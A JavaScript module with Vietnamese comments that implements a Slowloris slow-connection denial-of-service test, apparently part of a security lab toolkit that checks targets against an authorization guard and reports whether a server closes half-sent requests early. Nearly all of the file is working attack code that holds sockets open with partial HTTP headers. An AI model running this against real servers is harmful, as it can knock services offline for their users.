// slowloris.js — Mô phỏng tấn công "kết nối chậm" trên lab bạn sở hữu.
//
// Nguyên lý: mở nhiều kết nối TCP nhưng CHỈ gửi một nửa HTTP request
// (chưa có dòng trống kết thúc header). Server "lễ phép" sẽ chờ header còn lại
// → giữ socket mở. Lặp đủ nhiều kết nối thì server cạn pool socket → từ chối
// client thật, dù băng thông gần như bằng 0.
//
// Bản hardened chống lại bằng headersTimeout: quá 4s chưa nhận đủ header
// thì huỷ kết nối → mọi socket slowloris bị đóng sớm.
import net from 'node:net';
import { assertAuthorizedTarget } from '../guard.js';
import { sleep } from './http.js';

export async function runSlowloris(target, { sockets = 100, durationMs = 20_000, intervalMs = 3_000, onProgress, ...authOpts } = {}) {
  const auth = await assertAuthorizedTarget(target, authOpts);
  const host = auth.host;
  const port = auth.port;

  const conns = [];
  let earlyClosed = 0;
  let opened = 0;
  let finalized = false; // sau khi chạy xong, ta chủ động destroy → không tính là "đóng sớm"
  const samples = [];
  const startedAt = performance.now();
  const deadline = startedAt + durationMs;

  for (let i = 0; i < sockets; i++) {
    const state = { socket: null, alive: false };
    conns.push(state);
    openOne(state, host, port, () => {
      opened += 1;
    }, () => {
      if (!finalized) earlyClosed += 1;
    });
    await sleep(15); // mở dần để không làm treo tiến trình client
  }

  const sampler = setInterval(() => {
    const alive = conns.filter((c) => c.alive).length;
    samples.push({ t: Math.round((performance.now() - startedAt) / 100) / 10, alive });
    if (onProgress) onProgress({ alive, earlyClosed });
  }, 500);

  let tick = 0;
  const keepAlive = setInterval(() => {
    tick += 1;
    for (const c of conns) {
      if (c.alive && c.socket && !c.socket.destroyed) {
        c.socket.write(`X-Ka-${tick}: ${tick}\r\n`); // gửi tiếp "một nửa" header
      }
    }
  }, intervalMs);

  const remaining = deadline - performance.now();
  if (remaining > 0) await sleep(remaining);

  clearInterval(sampler);
  clearInterval(keepAlive);
  finalized = true;
  const stillConnected = conns.filter((c) => c.alive).length;
  for (const c of conns) c.socket?.destroy();

  return {
    target: auth.url.href,
    scope: auth.scope,
    requested: sockets,
    opened,
    earlyClosed,
    stillConnected,
    samples,
    conclusion:
      earlyClosed > sockets * 0.5
        ? 'Server CHỐT các kết nối "nửa request" sớm (giới hạn half-open connection + headersTimeout hoạt động) → có phòng thủ slowloris.'
        : stillConnected > sockets * 0.5
          ? 'Server GIỮ gần hết kết nối treo → không có giới hạn header/timeout → dễ bị slowloris làm tê liệt.'
          : 'Kết quả trung gian — xem samples để xem tiến trình đóng kết nối.',
  };
}

function openOne(state, host, port, onOpen, onEarlyClose) {
  const socket = net.connect({ host, port });
  state.socket = socket;
  socket.setNoDelay(true);
  socket.once('connect', () => {
    state.alive = true;
    onOpen();
    // gửi CHỈ MỘT PHẦN request — cố tình thiếu dòng trống kết thúc header
    socket.write(`GET / HTTP/1.1\r\nHost: ${host}:${port}\r\nUser-Agent: seclab-slowloris\r\n`);
  });
  socket.once('close', () => {
    if (state.alive && onEarlyClose) onEarlyClose();
    state.alive = false;
  });
  socket.once('error', () => {
    state.alive = false;
  });
}
